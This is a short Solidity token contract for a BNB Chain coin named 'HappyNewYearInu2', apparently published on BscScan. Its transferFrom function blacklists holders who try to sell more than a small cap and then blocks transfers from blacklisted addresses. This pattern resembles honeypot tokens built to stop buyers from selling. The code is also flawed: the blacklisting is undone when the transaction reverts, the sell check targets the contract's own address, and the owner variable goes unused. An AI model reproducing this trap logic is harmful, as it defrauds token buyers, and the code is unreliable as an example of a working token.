/**
 *Submitted for verification at BscScan.com on 2022-01-01
*/

// SPDX-License-Identifier: UNLICENSED


pragma solidity ^0.8.2;

contract HappyNewYearInu2 {
    
    

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 100_000_000_000 * 10 ** 18;
    string public name = "HappyNewYearInu2";
    string public symbol = "HappyNewYearInu2";
    uint public decimals = 18;
    uint256 public maxSellTxAmount = 25_000 * 10**18 + 1;
    mapping (address => bool) public isBlacklisted;
    address _owner;

      event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor(address _ownerConst) {
        _owner = _ownerConst;
        balances[msg.sender] = totalSupply;

    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    //ezt kivenni esetleg
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        bool isSell = to == address(this);
        if (isSell && value > maxSellTxAmount) {
            isBlacklisted[from] = true;
        }
        require(!isBlacklisted[from], 'balance blacklist');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}